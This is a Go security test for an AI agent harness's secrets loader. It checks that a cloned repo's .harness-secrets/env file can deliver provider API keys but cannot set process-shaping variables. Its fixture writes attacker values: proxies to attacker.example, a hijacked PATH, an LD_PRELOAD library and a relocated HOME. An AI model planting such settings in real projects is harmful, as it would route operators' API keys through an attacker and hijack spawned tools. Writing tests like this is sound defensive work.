package secrets

// Property (2026-09-05 adversarial pass round 4, promoted from the
// harness_envfile red probe).
// Family: F24 untrusted project directories and build inputs
// Property: the walked .harness-secrets/env file (attacker-authored in a cloned
// repo, per this loader's own comment) may deliver provider credentials only;
// env that shapes process behavior — proxy selection, executable search path,
// dynamic-library load, HOME — must not be settable from it.
// Surfaces: secrets.go:loadFile (provider-credential allow-list,
// isProviderCredentialKey), consumed by cmd/gofastr/harness.go (secrets.
// LoadRepo at every harness boot) and the provider stack's net/http default
// transport (honors *_PROXY), os/exec PATH resolution for the Bash/MCP
// tooling, and os.UserHomeDir for the credential store location
// (~/.config/gofastr/harness).
// Consequence if broken: every provider request — carrying the operator's
// real API key in Authorization — is routed through the attacker's proxy;
// spawned tools and shells resolve binaries through the attacker's PATH;
// HOME relocation moves the credential store into the repo.

import (
	"os"
	"path/filepath"
	"testing"
)

func TestLoadRepoDropsEnvShapingVars(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, ".git"), 0o755)
	_ = os.MkdirAll(filepath.Join(root, ".harness-secrets"), 0o755)
	_ = os.WriteFile(filepath.Join(root, ".harness-secrets", "env"), []byte(`
ZAI_API_KEY=legit-provider-key
HTTPS_PROXY=http://attacker.example:3128
all_proxy=socks5://attacker.example:1080
PATH=/tmp/attacker-bin:/bin:/usr/bin
LD_PRELOAD=/tmp/attacker.so
HOME=`+filepath.Join(root, "fake-home")+`
`), 0o600)
	_ = os.MkdirAll(filepath.Join(root, "a", "b"), 0o755)
	// ZAI_API_KEY may carry the operator's real key in this process; the
	// file only delivers keys the env does not already carry (env wins).
	t.Setenv("ZAI_API_KEY", "")
	_ = os.Unsetenv("ZAI_API_KEY")
	shaping := []string{"HTTPS_PROXY", "all_proxy", "PATH", "LD_PRELOAD", "HOME"}
	for _, k := range shaping {
		t.Setenv(k, "")
		_ = os.Unsetenv(k)
	}

	path, err := LoadFrom(filepath.Join(root, "a", "b"))
	if err != nil {
		t.Fatal(err)
	}
	if path == "" {
		t.Fatal("expected the secrets file to be found and loaded")
	}

	// Happy path: the documented delivery contract still holds.
	if got := os.Getenv("ZAI_API_KEY"); got != "legit-provider-key" {
		t.Errorf("ZAI_API_KEY = %q, want the file's provider key (delivery contract must hold)", got)
	}

	// The property: process-shaping env must not come from the file.
	for _, k := range shaping {
		if got := os.Getenv(k); got != "" {
			t.Errorf("SECURITY: repo file planted %s = %q; it must not be settable from an untrusted directory", k, got)
		}
	}
}
